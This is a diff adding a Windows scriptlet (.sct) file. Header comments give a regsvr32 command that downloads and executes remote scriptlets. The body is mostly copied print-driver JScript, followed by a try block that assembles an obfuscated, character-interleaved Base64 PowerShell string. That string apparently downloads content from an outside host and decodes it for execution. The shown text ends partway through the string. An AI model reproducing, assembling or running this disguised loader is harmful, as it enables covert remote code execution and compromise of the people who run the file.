@@ -1,0 +1,435 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Bandit"
+    progid="Bandit"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+	>
+
+	<!-- regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+	<!-- DFIR -->
+	<!--		.sct files are downloaded and executed from a path like this -->
+	<!-- Though, the name and extension are arbitary.. -->
+	<!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\2vcqsj3k\file[2].sct -->
+	<!-- Based on current research, no registry keys are written, since call "uninstall" -->
+
+
+	<!-- Proof Of Concept - Casey Smith @subTee --> 
+        <!-- @RedCanary - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct -->
+	<script language="JScript">
+		<![CDATA[
+
+			
+function getParameterDefs(scriptContext) {
+    /// <summary>
+    /// Get the base names for the ParameterDefs defined in the JS file
+    /// </summary>
+    /// <param name="scriptContext" type="IPrinterScriptContext">
+    ///     Script context object.
+    /// </param>
+
+    // Get PDC configuration file from script context
+    var pdcConfig = scriptContext.QueueProperties.GetReadStreamAsXML("PrintDeviceCapabilities");
+    // Set Standard namespaces with prefixes
+    SetStandardNameSpaces(pdcConfig);
+
+    // Get PDC root XML Node
+    var pdcRoot = pdcConfig.selectSingleNode("psf2:PrintDeviceCapabilities");
+    // Get all ParameterDef nodes in PDC
+    var parameterDefs = pdcRoot.selectNodes("*[@psf2:psftype='ParameterDef']");
+
+    // Make an array containing all base names for all the ParameterDef's
+    var pdcParameterDefs = new Array();
+    for (var defCount = 0; defCount < parameterDefs.length; defCount++) {
+        pdcParameterDefs[defCount] = parameterDefs[defCount].baseName;
+    }
+    return pdcParameterDefs;
+}
+
+
+// PSK NameSpace's
+var pskNs = "http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords";
+var psk11Ns = "http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11";
+var psk12Ns = "http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12";
+
+// psf NameSpace's
+var psf2Ns = "http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2";
+var psfNs = "http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework";
+
+// XML Schema NameSpace's
+var xsiNs = "http://www.w3.org/2001/XMLSchema-instance";
+var xsdNs = "http://www.w3.org/2001/XMLSchema";
+
+// PDF driver NameSpace
+var pdfNs = "http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf";
+
+
+function completePrintCapabilities(printTicket, scriptContext, printCapabilities) {
+    /// <param name="printTicket" type="IPrintSchemaTicket" mayBeNull="true">
+    ///     If not 'null', the print ticket's settings are used to customize the print capabilities.
+    /// </param>
+    /// <param name="scriptContext" type="IPrinterScriptContext">
+    ///     Script context object.
+    /// </param>
+    /// <param name="printCapabilities" type="IPrintSchemaCapabilities">
+    ///     Print capabilities object to be customized.
+    /// </param>
+
+    // Get PrintCapabilites XML node
+    var xmlCapabilities = printCapabilities.XmlNode;
+
+    var rootCapabilities;
+    // Set Standard namespaces with prefixes
+    SetStandardNameSpaces(xmlCapabilities);
+
+    rootCapabilities = xmlCapabilities.selectSingleNode("psf:PrintCapabilities");
+
+    if (rootCapabilities != null) {
+        var pdcConfig = scriptContext.QueueProperties.GetReadStreamAsXML("PrintDeviceCapabilities");
+        SetStandardNameSpaces(pdcConfig);
+
+        // Get PDC root XML Node
+        var pdcRoot = pdcConfig.selectSingleNode("psf2:PrintDeviceCapabilities");
+        // Get all ParameterDef nodes in PDC
+        var parameterDefs = pdcRoot.selectNodes("*[@psf2:psftype='ParameterDef']");
+        // Get prefix for PDF namespace
+        var pdfNsPrefix = getPrefixForNamespace(xmlCapabilities, pdfNs);
+
+        // Convert PDC ParameterDefs Nodes to PrintCapabilites ParameterDefs Nodes
+        for (var defCount = 0; defCount < parameterDefs.length; defCount++) {
+            var pdcParameterDef = parameterDefs[defCount];
+            var capabilitiesParamDef = CreateCapabilitiesParamDefFromPDC(pdcParameterDef, pdfNsPrefix, printCapabilities);
+            rootCapabilities.appendChild(capabilitiesParamDef);
+        }
+    }
+}
+
+
+
+function convertDevModeToPrintTicket(devModeProperties, scriptContext, printTicket) {
+    /// <param name="devModeProperties" type="IPrinterScriptablePropertyBag">
+    ///     The DevMode property bag.
+    /// </param>
+    /// <param name="scriptContext" type="IPrinterScriptContext">
+    ///     Script context object.
+    /// </param>
+    /// <param name="printTicket" type="IPrintSchemaTicket">
+    ///     Print ticket to be converted from the DevMode.
+    /// </param>
+
+
+    // Set Standard namespaces with prefixes
+    SetStandardNameSpaces(printTicket.XmlNode);
+    // Get prefix for PDF namespace
+    var pdfNsPrefix = getPrefixForNamespace(printTicket.XmlNode, pdfNs);
+
+    // If pdf namespace prefix is not found, that means that print ticket is produced by a different printer and there is not PDF name space with in print ticket
+    // This could happen with some legacy application using print ticket wrongly. To avoid failures we are checking first and shot circuiting the rest of the code.
+    if (pdfNsPrefix != null) {
+        // Get ParameterDefs in PDC
+        var pdcParameterDefs = getParameterDefs(scriptContext);
+
+        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
+            // Get Devmode string related to ParameterDefs in PDC
+            var paramString = devModeProperties.getString(pdcParameterDefs[defCount]);
+
+            if (paramString != null && paramString.length > 0) {
+                // If Devmode string is present map to print ticket either by creating a new node or modifying the existing node 
+
+                // Add prefix to ParameterDef base name
+                var paramName = pdfNsPrefix + ":" + pdcParameterDefs[defCount];
+
+                // Try getting the related ParameterInit in the PrintTicket
+                var currNode = printTicket.GetParameterInitializer(pdcParameterDefs[defCount], pdfNs)
+                if (currNode == null) {
+                    // Create node if no node is present
+                    var ptRoot = printTicket.XmlNode.selectSingleNode("psf:PrintTicket");
+                    var newParam = createProperty(paramName, "psf:ParameterInit", "xsd:string", paramString, printTicket);
+                    ptRoot.appendChild(newParam);
+                } else {
+                    // Change the value of the node to Devmode string value
+                    currNode.Value = paramString;
+                }
+            }
+        }
+    }
+}
+
+function convertPrintTicketToDevMode(printTicket, scriptContext, devModeProperties) {
+    /// <param name="printTicket" type="IPrintSchemaTicket">
+    ///     Print ticket to be converted to DevMode.
+    /// </param>
+    /// <param name="scriptContext" type="IPrinterScriptContext">
+    ///     Script context object.
+    /// </param>
+    /// <param name="devModeProperties" type="IPrinterScriptablePropertyBag">
+    ///     The DevMode property bag.
+    /// </param>
+
+
+    // Set Standard namespaces with prefixes
+    SetStandardNameSpaces(printTicket.XmlNode);
+
+    // Get prefix for PDF namespace
+    var pdfNsPrefix = getPrefixForNamespace(printTicket.XmlNode, pdfNs);
+
+    // If pdf namespace prefix is not found, that means that print ticket is produced by a different printer and there is not PDF name space with in print ticket
+    // This could happen with some legacy application using print ticket wrongly. To avoid failures we are checking first and shot circuiting the rest of the code.
+    if (pdfNsPrefix != null) {
+        // Get ParameterDefs in PDC
+        var pdcParameterDefs = getParameterDefs(scriptContext);
+
+        for (var defCount = 0; defCount < pdcParameterDefs.length; defCount++) {
+            // Try getting the related ParameterInit in the PrintTicket
+            var currNode = printTicket.GetParameterInitializer(pdcParameterDefs[defCount], pdfNs)
+            if (currNode != null) {
+                // Set Devmode string with the value present in ParameterInit
+                devModeProperties.setString(pdcParameterDefs[defCount], currNode.Value);
+            }
+        }
+    }
+}
+
+function validatePrintTicket(printTicket, scriptContext) {
+    /// <param name="printTicket" type="IPrintSchemaTicket">
+    ///     Print ticket to be validated.
+    /// </param>
+    /// <param name="scriptContext" type="IPrinterScriptContext">
+    ///     Script context object.
+    /// </param>
+    /// <returns type="Number" integer="true">
+    ///     Integer value indicating validation status.
+    ///         1 - Print ticket is valid and was not modified.
+    ///         2 - Print ticket was modified to make it valid.
+    ///         0 - Print ticket is invalid.
+    /// </returns>
+
+    // There is nothing wrong with having only 1, 2 or 3 ParameterInit�s in PrintTicket for the same ParameterDefs that are present in PDC. 
+    // For that reason we just going to return 1 without any check
+    return 1;
+}
+
+function createProperty(strPropertyName, strNodeName, strValueType, strValue, documentNode) {
+    /// <summary>
+    /// Create a property XML Node with child Value Node containing the value
+    /// </summary>
+    /// <param name="strPropertyName" type="String">
+    ///   Name of the property Node
+    /// </param>
+    /// <param name="strNodeName" type="String">
+    ///   Name to be assigned to the "name" attribute of the property
+    /// </param>
+    /// <param name="strValueType" type="String">
+    ///   Type of the value the in the Value Node
+    /// </param>
+    /// <param name="strValue" type="String">
+    ///   Actual value that is to be placed in the value node
+    /// </param>
+    /// <param name="documentNode" type="IXMLNode">
+    ///   Contains Document XML Node
+    /// </param>
+
+    var newNode = documentNode.XmlNode.createNode(1, strNodeName, psfNs);
+    newNode.setAttribute("name", strPropertyName);
+
+    if (strValueType.length > 0) {
+        var newProp = documentNode.XmlNode.createNode(1, "psf:Value", psfNs);
+        var newAttr = documentNode.XmlNode.createNode(2, "xsi:type", xsiNs);
+        newAttr.nodeValue = strValueType;
+        newProp.setAttributeNode(newAttr);
+
+        var newText = documentNode.XmlNode.createTextNode(strValue);
+
+        newProp.appendChild(newText);
+
+        newNode.appendChild(newProp);
+    }
+    return newNode;
+}
+
+try {
+    // Junta os comandos
+    var effected = "JԥAԥBԥwԥAԥHԥIԥAԥZԥQԥBԥlԥAԥHԥMԥAԥdԥAԥBԥhԥAԥGԥIԥAԥbԥAԥBԥpԥAԥHԥMԥAԥaԥAԥAԥgԥAԥDԥ0ԥAԥIԥAԥAԥnԥAԥFԥYԥAԥaԥwԥBԥGԥAԥEԥoԥAԥJԥwԥAԥ7ԥAԥCԥQԥAԥYԥwԥBԥhԥAԥGԥ0ԥAԥcԥAԥBԥhԥAԥGԥ4ԥAԥdԥQԥBԥsԥAԥGԥEԥAԥbԥAԥBԥlԥAԥHԥMԥAԥIԥAԥAԥ9ԥAԥCԥAԥAԥWԥwԥBԥTԥAԥHԥkԥAԥcԥwԥBԥ0ԥAԥGԥUԥAԥbԥQԥAԥuԥAԥEԥMԥAԥbԥwԥBԥuԥAԥHԥYԥAԥZԥQԥBԥyԥAԥHԥQԥAԥXԥQԥAԥ6ԥAԥDԥoԥAԥRԥgԥBԥyԥAԥGԥ8ԥAԥbԥQԥBԥCԥAԥGԥEԥAԥcԥwԥBԥlԥAԥDԥYԥAԥNԥAԥBԥTԥAԥHԥQԥAԥcԥgԥBԥpԥAԥGԥ4ԥAԥZԥwԥAԥoԥAԥCԥQԥAԥcԥAԥBԥyԥAԥGԥUԥAԥZԥQԥBԥzԥAԥHԥQԥAԥYԥQԥBԥiԥAԥGԥwԥAԥaԥQԥBԥzԥAԥGԥgԥAԥKԥQԥAԥ7ԥAԥCԥQԥAԥYԥQԥBԥjԥAԥGԥMԥAԥbԥwԥBԥ1ԥAԥGԥ4ԥAԥdԥAԥBԥhԥAԥGԥ4ԥAԥdԥAԥBԥzԥAԥGԥgԥAԥaԥQԥBԥwԥAԥHԥMԥAԥIԥAԥAԥ9ԥAԥCԥAԥAԥWԥwԥBԥTԥAԥHԥkԥAԥcԥwԥBԥ0ԥAԥGԥUԥAԥbԥQԥAԥuԥAԥFԥQԥAԥZԥQԥBԥ4ԥAԥHԥQԥAԥLԥgԥBԥFԥAԥGԥ4ԥAԥYԥwԥBԥvԥAԥGԥQԥAԥaԥQԥBԥuԥAԥGԥcԥAԥXԥQԥAԥ6ԥAԥDԥoԥAԥVԥQԥBԥUԥAԥEԥYԥAԥOԥAԥAԥuԥAԥEԥcԥAԥZԥQԥBԥ0ԥAԥFԥMԥAԥdԥAԥBԥyԥAԥGԥkԥAԥbԥgԥBԥnԥAԥCԥgԥAԥJԥAԥBԥjԥAԥGԥEԥAԥbԥQԥBԥwԥAԥGԥEԥAԥbԥgԥBԥ1ԥAԥGԥwԥAԥYԥQԥBԥsԥAԥGԥUԥAԥcԥwԥAԥpԥAԥDԥsԥAԥJԥAԥBԥjԥAԥGԥUԥAԥbԥgԥBԥ0ԥAԥHԥIԥAԥbԥwԥBԥiԥAԥGԥwԥAԥYԥQԥBԥzԥAԥHԥQԥAԥIԥAԥAԥ9ԥAԥCԥAԥAԥJԥwԥBԥaԥAԥEԥcԥAԥNԥQԥBԥzԥAԥGԥEԥAԥVԥwԥBԥJԥAԥHԥUԥAԥUԥwԥBԥVԥAԥDԥgԥAԥdԥQԥBԥTԥAԥEԥcԥAԥOԥQԥBԥ0ԥAԥFԥoԥAԥUԥQԥAԥ9ԥAԥDԥ0ԥAԥJԥwԥAԥ7ԥAԥCԥQԥAԥaԥQԥBԥjԥAԥGԥUԥAԥdԥwԥBԥhԥAԥHԥIԥAԥZԥAԥAԥgԥAԥDԥ0ԥAԥIԥAԥBԥbԥAԥFԥMԥAԥeԥQԥBԥzԥAԥHԥQԥAԥZԥQԥBԥtԥAԥCԥ4ԥAԥQԥwԥBԥvԥAԥGԥ4ԥAԥdԥgԥBԥlԥAԥHԥIԥAԥdԥAԥBԥdԥAԥDԥoԥAԥOԥgԥBԥGԥAԥHԥIԥAԥbԥwԥBԥtԥAԥGԥIԥAԥYԥQԥBԥzԥAԥGԥUԥAԥNԥg";
+    effected += "ԥAԥ0ԥAԥFԥMԥAԥdԥAԥBԥyԥAԥGԥkԥAԥbԥgԥBԥnԥAԥCԥgԥAԥJԥAԥBԥjԥAԥGԥUԥAԥbԥgԥBԥ0ԥAԥHԥIԥAԥbԥwԥBԥiԥAԥGԥwԥAԥYԥQԥBԥzԥAԥHԥQԥAԥKԥQԥAԥ7ԥAԥCԥQԥAԥcԥgԥBԥlԥAԥHԥMԥAԥZԥQԥBԥyԥAԥHԥYԥAԥZԥQԥBԥyԥAԥHԥkԥAԥIԥAԥAԥ9ԥAԥCԥAԥAԥWԥwԥBԥTԥAԥHԥkԥAԥcԥwԥBԥ0ԥAԥGԥUԥAԥbԥQԥAԥuԥAԥFԥQԥAԥZԥQԥBԥ4ԥAԥHԥQԥAԥLԥgԥBԥFԥAԥGԥ4ԥAԥYԥwԥBԥvԥAԥGԥQԥAԥaԥQԥBԥuԥAԥGԥcԥAԥXԥQԥAԥ6ԥAԥDԥoԥAԥVԥQԥBԥUԥAԥEԥYԥAԥOԥAԥAԥuԥAԥEԥcԥAԥZԥQԥBԥ0ԥAԥFԥMԥAԥdԥAԥBԥyԥAԥGԥkԥAԥbԥgԥBԥnԥAԥCԥgԥAԥJԥAԥBԥpԥAԥGԥMԥAԥZԥQԥBԥ3ԥAԥGԥEԥAԥcԥgԥBԥkԥAԥCԥkԥAԥOԥwԥBԥBԥAԥGԥQԥAԥZԥAԥAԥtԥAԥFԥQԥAԥeԥQԥBԥwԥAԥGԥUԥAԥIԥAԥAԥtԥAԥEԥEԥAԥcԥwԥBԥzԥAԥGԥUԥAԥbԥQԥBԥiԥAԥGԥwԥAԥeԥQԥBԥOԥAԥGԥEԥAԥbԥQԥBԥlԥAԥCԥAԥAԥUԥwԥBԥ5ԥAԥHԥMԥAԥdԥAԥBԥlԥAԥGԥ0ԥAԥLԥgԥBԥEԥAԥHԥIԥAԥYԥQԥBԥ3ԥAԥGԥkԥAԥbԥgԥBԥnԥAԥDԥsԥAԥJԥAԥBԥiԥAԥHԥIԥAԥYԥQԥBԥpԥAԥGԥ4ԥAԥcԥwԥBԥ0ԥAԥGԥUԥAԥbԥQԥBԥzԥAԥDԥ0ԥAԥJԥwԥBԥoԥAԥHԥQԥAԥdԥAԥBԥwԥAԥHԥMԥAԥOԥgԥAԥvԥAԥCԥ8ԥAԥYԥwԥBԥkԥAԥGԥ4ԥAԥLԥgԥBԥ0ԥAԥGԥEԥAԥZԥwԥBԥiԥAԥGԥ8ԥAԥeԥAԥAԥuԥAԥGԥkԥAԥbԥwԥAԥvԥAԥGԥEԥAԥcԥwԥBԥzԥAԥGԥUԥAԥdԥAԥBԥzԥAԥCԥ8ԥAԥNԥgԥAԥ4ԥAԥDԥQԥAԥMԥgԥBԥmԥAԥGԥQԥAԥMԥgԥAԥxԥAԥDԥQԥAԥZԥQԥBԥhԥAԥGԥIԥAԥOԥQԥAԥ4ԥAԥDԥAԥAԥMԥAԥAԥxԥAԥDԥEԥAԥZԥgԥAԥ0ԥAԥDԥIԥAԥOԥAԥAԥ5ԥAԥDԥkԥAԥLԥwԥBԥmԥAԥDԥgԥAԥMԥgԥBԥlԥAԥGԥEԥAԥNԥAԥAԥ0ԥAԥDԥUԥAԥLԥQԥAԥxԥAԥDԥcԥAԥZԥQԥBԥiԥAԥCԥ0ԥAԥNԥAԥBԥmԥAԥDԥQԥAԥYԥgԥAԥtԥAԥGԥIԥAԥNԥAԥAԥ4ԥAԥDԥAԥAԥLԥQԥAԥ4ԥAԥGԥQԥAԥMԥgԥAԥ2ԥAԥDԥIԥAԥZԥQԥAԥzԥAԥDԥkԥAԥMԥAԥAԥ4ԥAԥDԥMԥAԥOԥAԥAԥtԥAԥCԥ0ԥAԥLԥQԥBԥ3ԥAԥHԥAԥAԥNԥAԥAԥwԥAԥDԥkԥAԥNԥgԥAԥ3ԥAԥDԥkԥAԥOԥQԥAԥ";
+    effected += "tԥAԥGԥwԥAԥbԥwԥBԥzԥAԥHԥQԥAԥLԥQԥBԥpԥAԥGԥ4ԥAԥLԥQԥBԥzԥAԥHԥAԥAԥYԥQԥBԥjԥAԥGԥUԥAԥLԥQԥBԥ3ԥAԥGԥEԥAԥbԥAԥBԥsԥAԥHԥAԥAԥYԥQԥBԥwԥAԥGԥUԥAԥcԥgԥBԥzԥAԥCԥ4ԥAԥaԥgԥBԥwԥAԥGԥcԥAԥJԥwԥAԥ7ԥAԥCԥQԥAԥYԥgԥBԥyԥAԥGԥ8ԥAԥaԥQԥBԥuԥAԥGԥQԥAԥZԥQԥBԥyԥAԥGԥcԥAԥPԥQԥBԥOԥAԥGԥUԥAԥdԥwԥAԥtԥAԥEԥ8ԥAԥYԥgԥBԥqԥAԥGԥUԥAԥYԥwԥBԥ0ԥAԥCԥAԥAԥUԥwԥBԥ5ԥAԥHԥMԥAԥdԥAԥBԥlԥAԥGԥ0ԥAԥLԥgԥBԥOԥAԥGԥUԥAԥdԥAԥAԥuԥAԥFԥcԥAԥZԥQԥBԥiԥAԥEԥMԥAԥbԥAԥBԥpԥAԥGԥUԥAԥbԥgԥBԥ0ԥAԥDԥsԥAԥJԥAԥBԥiԥAԥHԥIԥAԥbԥwԥBԥpԥAԥGԥ4ԥAԥZԥAԥBԥlԥAԥHԥIԥAԥZԥwԥAԥuԥAԥEԥgԥAԥZԥQԥBԥhԥAԥGԥQԥAԥZԥQԥBԥyԥAԥHԥMԥAԥLԥgԥBԥBԥAԥGԥQԥAԥZԥAԥAԥoԥAԥCԥcԥAԥVԥQԥBԥzԥAԥGԥUԥAԥcԥgԥAԥtԥAԥEԥEԥAԥZԥwԥBԥlԥAԥGԥ4ԥAԥdԥAԥAԥnԥAԥCԥwԥAԥJԥwԥBԥNԥAԥGԥ8ԥAԥeԥgԥBԥpԥAԥGԥwԥAԥbԥAԥBԥhԥAԥCԥ8ԥAԥNԥQԥAԥuԥAԥDԥAԥAԥJԥwԥAԥpԥAԥDԥsԥAԥJԥAԥBԥiԥAԥHԥIԥAԥdԥQԥBԥ0ԥAԥGԥEԥAԥbԥAԥBԥpԥAԥHԥMԥAԥYԥQԥBԥ0ԥAԥGԥkԥAԥbԥwԥBԥuԥAԥDԥ0ԥAԥJԥAԥBԥiԥAԥHԥIԥAԥbԥwԥBԥpԥAԥGԥ4ԥAԥZԥAԥBԥlԥAԥHԥIԥAԥZԥwԥAԥuԥAԥEԥQԥAԥbԥwԥBԥ3ԥAԥGԥ4ԥAԥbԥAԥBԥvԥAԥGԥEԥAԥZԥAԥBԥEԥAԥGԥEԥAԥdԥAԥBԥhԥAԥCԥgԥAԥJԥAԥBԥiԥAԥHԥIԥAԥYԥQԥBԥpԥAԥGԥ4ԥAԥcԥwԥBԥ0ԥAԥGԥUԥAԥbԥQԥBԥzԥAԥCԥkԥAԥOԥwԥAԥkԥAԥGԥMԥAԥeԥQԥBԥjԥAԥGԥwԥAԥbԥwԥBԥuԥAԥGԥUԥAԥdԥQԥBԥyԥAԥGԥ8ԥAԥdԥQԥBԥzԥAԥDԥ0ԥAԥWԥwԥBԥiԥAԥHԥkԥAԥdԥAԥBԥlԥAԥFԥsԥAԥXԥQԥBԥdԥAԥCԥgԥAԥMԥAԥBԥ4ԥAԥDԥQԥAԥMԥgԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥQԥAԥRԥAԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥkԥAԥMԥgԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥgԥAԥQԥQԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥMԥAԥNԥwԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥAԥAԥMԥAԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥA";
+    effected += "ԥDԥAԥAԥMԥAԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥAԥAԥMԥAԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥAԥAԥMԥAԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥAԥAԥMԥAԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥMԥAԥNԥgԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥAԥAԥMԥAԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥAԥAԥMԥAԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥAԥAԥMԥAԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥIԥAԥOԥAԥAԥsԥAԥCԥAԥAԥMԥAԥBԥ4ԥAԥDԥAԥAԥMԥAԥAԥpԥAԥDԥsԥAԥJԥAԥBԥtԥAԥGԥ8ԥAԥbԥgԥBԥvԥAԥHԥAԥAԥaԥAԥBԥ5ԥAԥHԥMԥAԥaԥQԥBԥ0ԥAԥGԥkԥAԥYԥwԥAԥ9ԥAԥCԥ0ԥAԥMԥQԥAԥ7ԥAԥGԥYԥAԥbԥwԥBԥyԥAԥCԥgԥAԥJԥAԥBԥoԥAԥGԥUԥAԥbԥQԥBԥvԥAԥGԥcԥAԥcԥgԥBԥlԥAԥGԥcԥAԥYԥQԥBԥyԥAԥGԥkԥAԥbԥgԥBԥlԥAԥDԥ0ԥAԥMԥAԥAԥ7ԥAԥCԥQԥAԥaԥAԥBԥlԥAԥGԥ0ԥAԥbԥwԥBԥnԥAԥHԥIԥAԥZԥQԥBԥnԥAԥGԥEԥAԥcԥgԥBԥpԥAԥGԥ4ԥAԥZԥQԥAԥgԥAԥCԥ0ԥAԥbԥAԥBԥlԥAԥCԥAԥAԥJԥAԥBԥiԥAԥHԥIԥAԥdԥQԥBԥ0ԥAԥGԥEԥAԥbԥAԥBԥpԥAԥHԥMԥAԥYԥQԥBԥ0ԥAԥGԥkԥAԥbԥwԥBԥuԥAԥCԥ4ԥAԥTԥAԥBԥlԥAԥGԥ4ԥAԥZԥwԥBԥ0ԥAԥGԥgԥAԥLԥQԥAԥkԥAԥGԥMԥAԥeԥQԥBԥjԥAԥGԥwԥAԥbԥwԥBԥuԥAԥGԥUԥAԥdԥQԥBԥyԥAԥGԥ8ԥAԥdԥQԥBԥzԥAԥCԥ4ԥAԥTԥAԥBԥlԥAԥGԥ4ԥAԥZԥwԥBԥ0ԥAԥGԥgԥAԥOԥwԥAԥkԥAԥGԥgԥAԥZԥQԥBԥtԥAԥGԥ8ԥAԥZԥwԥBԥyԥAԥGԥUԥAԥZԥwԥBԥhԥAԥHԥIԥAԥaԥQԥBԥuԥAԥGԥUԥAԥKԥwԥAԥrԥAԥCԥkԥAԥeԥwԥAԥgԥAԥCԥQԥAԥTԥQԥBԥlԥAԥHԥQԥAԥaԥQԥBԥzԥAԥDԥ0ԥAԥJԥAԥBԥ0ԥAԥHԥIԥAԥdԥQԥBԥlԥAԥDԥsԥAԥZԥgԥBԥvԥAԥHԥIԥAԥKԥAԥAԥkԥAԥGԥ4ԥAԥbԥwԥBԥuԥAԥHԥQԥAԥYԥQԥBԥyԥAԥGԥkԥAԥZԥgԥBԥmԥAԥDԥ0ԥAԥMԥAԥAԥ7ԥAԥCԥQԥAԥbԥgԥBԥvԥAԥGԥ4ԥAԥdԥAԥBԥhԥAԥHԥIԥAԥaԥQԥBԥmԥAԥGԥYԥAԥIԥAԥAԥtԥAԥGԥwԥAԥdԥAԥAԥgԥAԥCԥQԥAԥYԥwԥBԥ5ԥAԥGԥMԥAԥbԥAԥBԥvԥAԥGԥ4ԥAԥZԥQԥBԥ1ԥAԥHԥIԥAԥbԥwԥBԥ1ԥAԥHԥMԥAԥLԥgԥBԥMԥAԥG";
+    effected += "ԥUԥAԥbԥgԥBԥnԥAԥHԥQԥAԥaԥAԥAԥ7ԥAԥCԥQԥAԥbԥgԥBԥvԥAԥGԥ4ԥAԥdԥAԥBԥhԥAԥHԥIԥAԥaԥQԥBԥmԥAԥGԥYԥAԥKԥwԥAԥrԥAԥCԥkԥAԥeԥwԥBԥpԥAԥGԥYԥAԥKԥAԥAԥkԥAԥGԥIԥAԥcԥgԥBԥ1ԥAԥHԥQԥAԥYԥQԥBԥsԥAԥGԥkԥAԥcԥwԥBԥhԥAԥHԥQԥAԥaԥQԥBԥvԥAԥGԥ4ԥAԥWԥwԥAԥkԥAԥGԥgԥAԥZԥQԥBԥtԥAԥGԥ8ԥAԥZԥwԥBԥyԥAԥGԥUԥAԥZԥwԥBԥhԥAԥHԥIԥAԥaԥQԥBԥuԥAԥGԥUԥAԥKԥwԥAԥkԥAԥGԥ4ԥAԥbԥwԥBԥuԥAԥHԥQԥAԥYԥQԥBԥyԥAԥGԥkԥAԥZԥgԥBԥmԥAԥFԥ0ԥAԥIԥAԥAԥtԥAԥGԥ4ԥAԥZԥQԥAԥgԥAԥCԥQԥAԥYԥwԥBԥ5ԥAԥGԥMԥAԥbԥAԥBԥvԥAԥGԥ4ԥAԥZԥQԥBԥ1ԥAԥHԥIԥAԥbԥwԥBԥ1ԥAԥHԥMԥAԥWԥwԥAԥkԥAԥGԥ4ԥAԥbԥwԥBԥuԥAԥHԥQԥAԥYԥQԥBԥyԥAԥGԥkԥAԥZԥgԥBԥmԥAԥFԥ0ԥAԥKԥQԥBԥ7ԥAԥCԥQԥAԥTԥQԥBԥlԥAԥHԥQԥAԥaԥQԥBԥzԥAԥDԥ0ԥAԥJԥAԥBԥiԥAԥHԥUԥAԥdԥAԥBԥ0ԥAԥGԥ8ԥAԥbԥgԥBԥoԥAԥGԥ8ԥAԥbԥAԥBԥlԥAԥGԥQԥAԥOԥwԥBԥiԥAԥHԥIԥAԥZԥQԥBԥhԥAԥGԥsԥAԥfԥQԥBԥ9ԥAԥGԥkԥAԥZԥgԥAԥoԥAԥCԥQԥAԥTԥQԥBԥlԥAԥHԥQԥAԥaԥQԥBԥzԥAԥCԥkԥAԥeԥwԥAԥkԥAԥGԥ0ԥAԥbԥwԥBԥuԥAԥGԥ8ԥAԥcԥAԥBԥoԥAԥHԥkԥAԥcԥwԥBԥpԥAԥHԥQԥAԥaԥQԥBԥjԥAԥDԥ0ԥAԥJԥAԥBԥoԥAԥGԥUԥAԥbԥQԥBԥvԥAԥGԥcԥAԥcԥgԥBԥlԥAԥGԥcԥAԥYԥQԥBԥyԥAԥGԥkԥAԥbԥgԥBԥlԥAԥDԥsԥAԥYԥgԥBԥyԥAԥGԥUԥAԥYԥQԥBԥrԥAԥHԥ0ԥAԥfԥQԥBԥpԥAԥGԥYԥAԥKԥAԥAԥkԥAԥGԥ0ԥAԥbԥwԥBԥuԥAԥGԥ8ԥAԥcԥAԥBԥoԥAԥHԥkԥAԥcԥwԥBԥpԥAԥHԥQԥAԥaԥQԥBԥjԥAԥCԥAԥAԥLԥQԥBԥlԥAԥHԥEԥAԥIԥAԥAԥtԥAԥDԥEԥAԥKԥQԥBԥ7ԥAԥHԥIԥAԥZԥQԥBԥ0ԥAԥHԥUԥAԥcԥgԥBԥuԥAԥHԥ0ԥAԥOԥwԥAԥkԥAԥGԥYԥAԥbԥAԥBԥhԥAԥHԥYԥAԥaԥQԥBԥjԥAԥGԥEԥAԥbԥgԥBԥ0ԥAԥDԥ0ԥAԥJԥAԥBԥiԥAԥHԥIԥAԥdԥQԥBԥ0ԥAԥGԥEԥAԥbԥAԥBԥpԥAԥHԥMԥAԥYԥQԥBԥ0ԥAԥGԥkԥAԥbԥwԥBԥuԥAԥFԥsԥAԥJԥAԥBԥtԥAԥGԥ8ԥAԥbԥgԥBԥvԥAԥHԥAԥAԥaԥAԥBԥ5ԥAԥHԥM";
